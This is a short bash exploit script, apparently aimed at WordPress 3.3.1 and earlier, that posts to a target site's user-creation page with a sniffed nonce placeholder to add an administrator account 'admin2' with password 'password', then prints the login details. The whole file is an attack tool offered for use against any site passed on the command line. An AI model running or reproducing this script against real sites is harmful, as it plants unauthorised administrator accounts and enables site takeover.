#!/bin/bash
# WordPress <= 3.3.1 Vuln
# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)
# Updates: https://github.com/Shadowz3n/WP3.3.1
if [[ "$1" ]]; then
	ADDADMIN=`curl -s -o "/dev/null" -w "%{http_code}" "$1/wp-admin/user-new.php" -d "action=createuser&_wpnonce_create-user=<sniffed_value>&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=admin2&email=admin2@admin.com&first_name=admin2@admin.com&last_name=&url=&pass1=password&pass2=password&role=administrator&createuser=Add+New+User+"`
	if [[ "$ADDADMIN" = '200' || "$ADDADMIN" = '200' ]]; then
		echo -e "\tLink:$1/wp-admin \n\tLogin: admin2 \n\tPass: password"
	fi
	
else
	echo -e "Usage: ./addwpadmin.sh site.com"
fi
